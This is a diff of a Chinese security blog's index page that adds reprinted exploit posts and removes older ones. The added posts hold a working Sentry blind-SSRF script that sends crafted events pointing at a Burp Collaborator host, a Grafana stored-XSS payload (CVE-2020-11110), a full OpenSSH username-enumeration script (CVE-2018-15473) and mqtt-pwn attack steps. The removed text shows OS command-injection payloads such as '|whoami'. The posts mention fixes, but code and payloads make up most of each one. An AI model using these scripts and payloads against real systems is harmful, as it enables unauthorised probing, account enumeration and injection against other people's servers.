@@ -86,6 +86,197 @@
 
     
         <h2 class="title">
+            <a href="/2024/01/19/Sentry-SSRF/">
+                Sentry SSRF
+            </a>
+        </h2>
+    
+    <time>
+        Jan 19, 2024
+    </time>
+    <section class="content">
+        <h1><span id="sentry-ssrf">Sentry SSRF</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12979368.html">Mysticbinary</a> 并作补充</p>
+</blockquote>
+<h2><span id="what-is-sentry">What is Sentry</span></h2><blockquote>
+<p>Sentry 是一个实时的事件日志和聚合平台，基于 Django 构建。一般在url上、或者logo上看到有sentry都可以用它的exp试试，原理是由于sentry默认开启source code scrapping ，导致可以从外部进行blind ssrf请求。</p>
+</blockquote>
+<h2><span id="exp-testing">exp testing</span></h2><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(python3) ➜  sentrySSRF git:(master) python sentrySSRF.py -i http://【your target url】 -d</span><br><span class="line">Found Sentry: https://ef00ffc3xxxxxe5b60afff8c138c77e@【your target url】/1</span><br><span class="line">Enter your burpcollaborator address:【your dnslog】</span><br></pre></td></tr></table></figure>
+
+<p>然后去你到dnslog看看有没有请求记录即可。</p>
+<p>exp源码参考：<br>配置如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = <span class="string">&quot;https://a8d729459beb446eb3cbb9df997dcc7b@sentry.mindworks.xyz/1&quot;</span></span><br><span class="line">    collaborator = <span class="string">&quot;dp6sk5k006h6dcq3bdu6e6a9t0zqnf.burpcollaborator.net&quot;</span></span><br><span class="line">    key = re.search(<span class="string">&#x27;https://(.*)@&#x27;</span>, s)</span><br><span class="line">    domain = re.search(<span class="string">&#x27;@(.*)/&#x27;</span>, s)</span><br><span class="line">    number = re.search(<span class="string">&#x27;/(.*)&#x27;</span>, s[<span class="number">8</span>:])</span><br><span class="line">    url = <span class="string">&quot;https://&quot;</span> + domain.group(<span class="number">1</span>) + <span class="string">&quot;/api/&quot;</span> + number.group(<span class="number">1</span>) + <span class="string">&quot;/store/?sentry_key=&quot;</span> + key.group(<span class="number">1</span>) + <span class="string">&quot;&amp;sentry_version=7&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    datas = &#123;<span class="string">&quot;extra&quot;</span>:&#123;<span class="string">&quot;component&quot;</span>:<span class="string">&quot;redux/actions/index&quot;</span>,<span class="string">&quot;action&quot;</span>:<span class="string">&quot;RegisterDeviceWeb&quot;</span>,<span class="string">&quot;serialized&quot;</span>:&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;INVALID_CREDENTIALS&quot;</span>,<span class="string">&quot;details&quot;</span>:[]&#125;&#125;,<span class="string">&quot;fingerprint&quot;</span>:[<span class="string">&quot;3cbf661c7f723b0a5816c16968fd9493&quot;</span>,<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>],<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>,<span class="string">&quot;stacktrace&quot;</span>:&#123;<span class="string">&quot;frames&quot;</span>:[&#123;<span class="string">&quot;colno&quot;</span>:<span class="number">218121</span>,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;http://&quot;</span>+collaborator,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;lineno&quot;</span>:<span class="number">1</span>&#125;]&#125;,<span class="string">&quot;exception&quot;</span>:&#123;<span class="string">&quot;values&quot;</span>:[&#123;<span class="string">&quot;value&quot;</span>:<span class="string">&quot;Custom Object&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Error&quot;</span>&#125;]&#125;,<span class="string">&quot;event_id&quot;</span>:<span class="string">&quot;d0513ec5a3544e05aef0d1c7c5b24bae&quot;</span>,<span class="string">&quot;platform&quot;</span>:<span class="string">&quot;javascript&quot;</span>,<span class="string">&quot;sdk&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sentry.javascript.browser&quot;</span>,<span class="string">&quot;packages&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;npm:@sentry/browser&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;],<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;,<span class="string">&quot;release&quot;</span>:<span class="string">&quot;6225dd99&quot;</span>,<span class="string">&quot;user&quot;</span>:&#123;<span class="string">&quot;phash&quot;</span>:<span class="string">&quot;996a3f4661e02cb505ae0daf406555e9b914f9d43d635c52cfc7485046862a7f&quot;</span>&#125;,<span class="string">&quot;breadcrumbs&quot;</span>:[&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="number">1554226659.455</span>,<span class="string">&quot;category&quot;</span>:<span class="string">&quot;navigation&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;from&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;to&quot;</span>:<span class="string">&quot;/login&quot;</span>&#125;&#125;]&#125;</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;Origin&#x27;</span>:<span class="string">&#x27;https://z.tochka.com/&#x27;</span>&#125;</span><br><span class="line">    rsp = requests.post(url, json=datas, headers=headers)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="to-build-blind-http-pack">To Build blind http pack</span></h2><blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/1/store/?sentry_version=7&amp;sentry_client=raven-js%2f3.15.0&amp;sentry_key=【your</span> key】 <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 【your <span class="string">target</span> url】.com</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line">Origin:【随意domain】</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-smalltalk">&#123;<span class="comment">&quot;project&quot;</span>:<span class="comment">&quot;30&quot;</span>,<span class="comment">&quot;logger&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;platform&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;exception&quot;</span>:&#123;<span class="comment">&quot;values&quot;</span>:[&#123;<span class="comment">&quot;type&quot;</span>:<span class="comment">&quot;Error&quot;</span>,<span class="comment">&quot;value&quot;</span>:<span class="comment">&quot;Trying to get control scope but angular isn&#x27;t ready yet or something like this&quot;</span>,<span class="comment">&quot;stacktrace&quot;</span>:&#123;<span class="comment">&quot;frames&quot;</span>:[&#123;<span class="comment">&quot;filename&quot;</span>:<span class="comment">&quot;http://【your dnslog】&quot;</span>,<span class="comment">&quot;lineno&quot;</span>:<span class="number">110</span>,<span class="comment">&quot;colno&quot;</span>:<span class="number">81071</span>,<span class="comment">&quot;function&quot;</span>:<span class="comment">&quot;XMLHttpRequest.o&quot;</span>,<span class="comment">&quot;in_app&quot;</span>:<span class="keyword">true</span>&#125;]&#125;&#125;]&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/Sentry-SSRF/1.png" alt="image"></p>
+<p>sentry_version &#x3D; 红线2 （报错可以手动修改几个其他版本试试）<br>sentry_key &#x3D; Raven.config 红线1<br>origin &#x3D; 可以随便写</p>
+</blockquote>
+<h2><span id="repair">Repair</span></h2><blockquote>
+<p>1、sentry关闭 source code scrapping；<br>2、保证配置文件中的黑名单不为空：&#x2F;sentry&#x2F;conf&#x2F;server.py</p>
+</blockquote>
+<h2><span id="reference">Reference</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/374737">https://hackerone.com/reports/374737</a><br><a target="_blank" rel="noopener" href="https://github.com/xawdxawdx/sentrySSRF">https://github.com/xawdxawdx/sentrySSRF</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a><a class="tag-none-link" href="/tags/Sentry/" rel="tag">Sentry</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/19/CVE-2020-11110-Grafana/">
+                Grafana 存储型XSS漏洞（CVE-2020-11110）
+            </a>
+        </h2>
+    
+    <time>
+        Jan 19, 2024
+    </time>
+    <section class="content">
+        <h1><span id="grafana-存储型xss漏洞cve-2020-11110">Grafana 存储型XSS漏洞（CVE-2020-11110）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hi-blog/p/grafana-stored-xss-CVE-2020-11110.html">starnight_cyber</a> 并作补充</p>
+</blockquote>
+<h2><span id="preface">Preface</span></h2><blockquote>
+<p>Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。Grafana 存在未授权任意文件读取漏洞，攻击者在未经身份验证的情况下可通过该漏洞读取主机上的任意文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CVE编号：</span><br><span class="line">    CVE-<span class="number">2020</span>-<span class="number">11110</span></span><br><span class="line">影响范围：</span><br><span class="line">    Grafana v6<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">Links</span><br><span class="line">    https://ctf-writeup.revers3c.com/challenges/web/CVE-<span class="number">2020</span>-<span class="number">11110</span>/index.html</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="复现记录">复现记录</span></h2><h3><span id="测试环境部署">测试环境部署</span></h3><blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload =&gt; </span><br><span class="line">&#123;&quot;dashboard&quot;:&#123;&quot;annotations&quot;:&#123;&quot;list&quot;:[&#123;&quot;name&quot;:&quot;Annotations &amp; Alerts&quot;,&quot;enable&quot;:true,&quot;iconColor&quot;:&quot;rgba(0, 211, 255, 1)&quot;,&quot;type&quot;:&quot;dashboard&quot;,&quot;builtIn&quot;:1,&quot;hide&quot;:true&#125;]&#125;,&quot;editable&quot;:true,&quot;gnetId&quot;:null,&quot;graphTooltip&quot;:0,&quot;id&quot;:null,&quot;links&quot;:[],&quot;panels&quot;:[],&quot;schemaVersion&quot;:18,&quot;snapshot&quot;:&#123;&quot;originalUrl&quot;:&quot;javascript:alert(&#x27;Revers3c&#x27;)&quot;,&quot;timestamp&quot;:&quot;2020-03-30T01:24:44.529Z&quot;&#125;,&quot;style&quot;:&quot;dark&quot;,&quot;tags&quot;:[],&quot;templating&quot;:&#123;&quot;list&quot;:[]&#125;,&quot;time&quot;:&#123;&quot;from&quot;:null,&quot;to&quot;:&quot;2020-03-30T01:24:53.549Z&quot;,&quot;raw&quot;:&#123;&quot;from&quot;:&quot;6h&quot;,&quot;to&quot;:&quot;now&quot;&#125;&#125;,&quot;timepicker&quot;:&#123;&quot;refresh_intervals&quot;:[&quot;5s&quot;,&quot;10s&quot;,&quot;30s&quot;,&quot;1m&quot;,&quot;5m&quot;,&quot;15m&quot;,&quot;30m&quot;,&quot;1h&quot;,&quot;2h&quot;,&quot;1d&quot;],&quot;time_options&quot;:[&quot;5m&quot;,&quot;15m&quot;,&quot;1h&quot;,&quot;6h&quot;,&quot;12h&quot;,&quot;24h&quot;,&quot;2d&quot;,&quot;7d&quot;,&quot;30d&quot;]&#125;,&quot;timezone&quot;:&quot;&quot;,&quot;title&quot;:&quot;Dashboard&quot;,&quot;uid&quot;:null,&quot;version&quot;:0&#125;,&quot;name&quot;:&quot;Dashboard&quot;,&quot;expires&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/CVE-2020-11110-Grafana/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="stored-xss">Stored-XSS</span></h3><blockquote>
+<p>替换 url 中的 localhost，访问快照地址，点击链接🔗图标。 Stored-XSS。</p>
+<p><img src="/2024/01/19/CVE-2020-11110-Grafana/2.png" alt="image"></p>
+</blockquote>
+<h3><span id="snapshot-快照删除">snapshot 快照删除</span></h3><blockquote>
+<p>访问 deleteUrl：</p>
+<p><a target="_blank" rel="noopener" href="http://103.210.162.186:3000/api/snapshots-delete/o3ITlrkiwgJexFmCJxr4gsNZ8QDcc0eQ">http://103.210.xx.xx:3000/api/snapshots-delete/o3ITlrkiwgJexFmCJxr4gsNZ8QDcc0eQ</a></p>
+<p><img src="/2024/01/19/CVE-2020-11110-Grafana/3.png" alt="image"></p>
+<p>可以删除 snapshot，这里算是个严重程度更高的漏洞。</p>
+</blockquote>
+<h2><span id="修复方案">修复方案</span></h2><blockquote>
+<p>版本升级。</p>
+</blockquote>
+<h2><span id="refer">Refer</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html">https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html</a></p>
+<p>以上！</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Grafana/" rel="tag">Grafana</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XSS/" rel="tag">XSS</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/19/CVE-2018-15473-OpenSSH/">
+                OpenSSH用户名枚举及其检测方法（CVE-2018-15473）
+            </a>
+        </h2>
+    
+    <time>
+        Jan 19, 2024
+    </time>
+    <section class="content">
+        <h1><span id="openssh用户名枚举及其检测方法cve-2018-15473">OpenSSH用户名枚举及其检测方法（CVE-2018-15473）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/726a3791b5b9">testerzhang</a> 并作补充</p>
+<p>OpenSSH 7.7前在接收到畸形的认证请求包时，会根据用户名的存在与否给出不同的响应，由此导致通过SSH服务枚举服务器的用户名。</p>
+</blockquote>
+<h3><span id="ssh-check-usernamepy-使用说明">ssh-check-username.py 使用说明</span></h3><blockquote>
+<ul>
+<li>安装依赖包 <code>pip install paramiko==2.0.8</code></li>
+<li>语法：<code>python ssh_checkusername.py ip username –port 22</code></li>
+</ul>
+</blockquote>
+<h3><span id="脚本">脚本</span></h3><blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright (c) 2018 Matthew Daley</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Permission is hereby granted, free of charge, to any person obtaining a copy</span></span><br><span class="line"><span class="comment"># of this software and associated documentation files (the &quot;Software&quot;), to</span></span><br><span class="line"><span class="comment"># deal in the Software without restriction, including without limitation the</span></span><br><span class="line"><span class="comment"># rights to use, copy, modify, merge, publish, distribute, sublicense, and/or</span></span><br><span class="line"><span class="comment"># sell copies of the Software, and to permit persons to whom the Software is</span></span><br><span class="line"><span class="comment"># furnished to do so, subject to the following conditions:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The above copyright notice and this permission notice shall be included in</span></span><br><span class="line"><span class="comment"># all copies or substantial portions of the Software.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span></span><br><span class="line"><span class="comment"># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span></span><br><span class="line"><span class="comment"># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span></span><br><span class="line"><span class="comment"># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span></span><br><span class="line"><span class="comment"># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING</span></span><br><span class="line"><span class="comment"># FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS</span></span><br><span class="line"><span class="comment"># IN THE SOFTWARE.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InvalidUsername</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_boolean</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[</span><br><span class="line">        paramiko.common.MSG_SERVICE_ACCEPT]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service_accept</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    paramiko.message.Message.add_boolean = add_boolean</span><br><span class="line">    <span class="keyword">return</span> old_service_accept(*args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">userauth_failure</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">raise</span> InvalidUsername()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">paramiko.auth_handler.AuthHandler._handler_table.update(&#123;</span><br><span class="line">    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,</span><br><span class="line">    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">&#x27;paramiko.transport&#x27;</span>).addHandler(logging.NullHandler())</span><br><span class="line"></span><br><span class="line">arg_parser = argparse.ArgumentParser()</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;hostname&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">22</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;username&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">args = arg_parser.parse_args()</span><br><span class="line"></span><br><span class="line">sock = socket.socket()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sock.connect((args.hostname, args.port))</span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[-] Failed to connect&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">transport = paramiko.transport.Transport(sock)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    transport.start_client()</span><br><span class="line"><span class="keyword">except</span> paramiko.ssh_exception.SSHException:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[-] Failed to negotiate SSH transport&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    transport.auth_publickey(args.username, paramiko.RSAKey.generate(<span class="number">2048</span>))</span><br><span class="line"><span class="keyword">except</span> InvalidUsername:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*] Invalid username&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">except</span> paramiko.ssh_exception.AuthenticationException:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Valid username&#x27;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="验证说明">验证说明：</span></h2><blockquote>
+<p>如果服务器存在的用户，则脚本会返回<code>Valid username</code></p>
+<p>如果服务器不存在的用户，则脚本会返回<code>Invalid username</code><br> 如果升级ssh版本之后：</p>
+<p>如果服务器存在的用户，则脚本会返回<code>Valid username</code></p>
+<p>如果服务器不存在的用户，则脚本会返回<code>Valid username</code></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/OpenSSH/" rel="tag">OpenSSH</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/19/MQTT-Pwd/">
+                MQTT未授权漏洞利用
+            </a>
+        </h2>
+    
+    <time>
+        Jan 19, 2024
+    </time>
+    <section class="content">
+        <h1><span id="mqtt未授权漏洞利用">MQTT未授权漏洞利用</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/suyu7/p/15290972.html">唐小风</a> 并作补充</p>
+</blockquote>
+<h3><span id="1-扫描端口">1、扫描端口</span></h3><blockquote>
+<p><img src="/2024/01/19/MQTT-Pwd/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="2-mqtt-pwd安装">2、mqtt-pwd安装</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/akamai-threat-research/mqtt-pwn.git</span><br><span class="line"><span class="built_in">cd</span> mqtt-pwd</span><br><span class="line">docker-compose up --build --detach</span><br><span class="line">docker-compose run cli</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">discovery</span><br><span class="line">scans</span><br><span class="line">scans -i 1</span><br><span class="line">topics</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/MQTT-Pwd/2.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/MQTT/" rel="tag">MQTT</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2024/01/19/Webshell-Bypass/">
                 一些webshell免杀的技巧
             </a>
@@ -702,435 +893,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XDebug/" rel="tag">XDebug</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/07/OS-Command-Injection/">
-                PortSwigger Academy | OS command injection 操作系统命令注入
-            </a>
-        </h2>
-    
-    <time>
-        Dec 7, 2023
-    </time>
-    <section class="content">
-        <h1><span id="portswigger-academy-os-command-injection-操作系统命令注入">PortSwigger Academy | OS command injection : 操作系统命令注入</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42942594/article/details/112474186">en0_0</a> 并作补充</p>
-</blockquote>
-<h2><span id="总结">总结</span></h2><blockquote>
-<ul>
-<li><p><code>&amp;name=1&amp;email=1%401.com||ping+-c+10+127.0.0.1||&amp;subject=1</code> 有时候需要url编码</p>
-</li>
-<li><p><code>productId=1&amp;storeId=1|whoami</code> POST方法不能用<code>&amp;</code></p>
-<p>在本节中，我们将解释什么是OS命令注入，描述如何检测和利用漏洞，为不同的操作系统拼写一些有用的命令和技术，并总结如何防止OS命令注入。</p>
-<p><img src="/2023/12/07/OS-Command-Injection/1.png" alt="image"></p>
-</li>
-</ul>
-</blockquote>
-<h2><span id="什么是os命令注入">什么是OS命令注入？</span></h2><blockquote>
-<p>操作系统命令注入（也称为外壳程序注入）是一个Web安全漏洞，它使攻击者可以在运行应用程序的服务器上执行任意操作系统（OS）命令，并且通常会完全破坏该应用程序及其所有数据。 攻击者通常可以利用OS命令注入漏洞来破坏托管基础结构的其他部分，利用信任关系将攻击转移到组织内的其他系统。</p>
-</blockquote>
-<h2><span id="执行任意命令">执行任意命令</span></h2><blockquote>
-<p>考虑一个购物应用程序，该应用程序使用户可以查看特定商店中某商品是否有库存。 该信息可通过如下网址访问：</p>
-<p><code>https://insecure-website.com/stockStatus?productID=381&amp;storeID=29</code></p>
-<p>为了提供库存信息，应用程序必须查询各种旧系统。 由于历史原因，该功能是通过使用产品和存储ID作为参数调用shell命令来实现的：</p>
-<p><code>stockreport.pl 381 29</code><br>此命令输出指定项目的库存状态，并返回给用户。</p>
-<p>由于该应用程序无法防御OS命令注入，因此攻击者可以提交以下输入以执行任意命令：</p>
-<p><code>&amp; echo aiwefwlguh &amp;</code></p>
-<p>如果此输入是在productID参数中提交的，那么应用程序执行的命令是：</p>
-<p><code>stockreport.pl &amp; echo aiwefwlguh &amp; 29</code></p>
-<p>echo命令只是使提供的字符串在输出中回显，并且是测试某些类型的OS命令注入的有用方法。 &amp; 字符是shell命令分隔符，因此执行的实际上是一个接一个的三个独立命令。 结果，返回给用户的输出为：</p>
